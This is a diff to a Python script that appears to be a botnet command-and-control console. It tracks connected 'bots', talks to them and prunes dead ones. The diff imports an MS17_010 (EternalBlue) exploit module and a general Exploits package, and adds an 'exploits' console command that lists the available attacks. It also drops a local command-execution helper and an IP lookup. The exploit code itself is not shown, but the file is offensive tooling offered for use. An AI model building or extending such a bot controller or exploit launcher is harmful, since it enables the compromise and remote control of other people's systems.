@@ -2,12 +2,14 @@
 # TODO Fix B2A
 """
 
+
+import MS17_010
+from Exploits import *
+from Utilities import *
 import socket
 import threading
-import os, subprocess
-import time
+import os
 os.chdir(os.path.abspath('/tmp/'))
-import requests
 #
 import http.server
 import socketserver
@@ -61,23 +63,9 @@ def start_listing(port):
 #             # todo - errors
 #             pass
 
-"""
-Execute command locally
-"""
-def execute_command(command):
-    if len(command) > 0:
-        print(command)
-        proc = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, cwd="/tmp")
-        return proc
 
-"""
-Get the host's IP
-"""
-def getIP():
-    ip = requests.session().get("http://httpbin.org/ip").text.split(":")[1].split('"')[1]
-    print(ip)
-    return
-    pass
+
+
 
 # def upload_binary(bot):
 #     #Setup
@@ -112,10 +100,6 @@ def getIP():
 #         pass
 #     proc.kill()
 #     pass
-
-
-
-
 
 
 """
@@ -291,11 +275,6 @@ def talk(bot):
         except:
             pass
 
-"""
-Stylish input()
-"""
-def s_input(string):
-    return input("["+string+"]>").strip("\n")
 
 """
 Remove all dead bots in "bots" list
@@ -428,6 +407,8 @@ def console():
             #upload_binary(bot)
         elif Command == "ping" or Command == "PING":
             ping()
+        elif Command == "exploits" or Command == "EXPLOITS" or Command == "EXP" or Command == "exp":
+            listExploits()
         elif Command == "exit":
             break
         else:
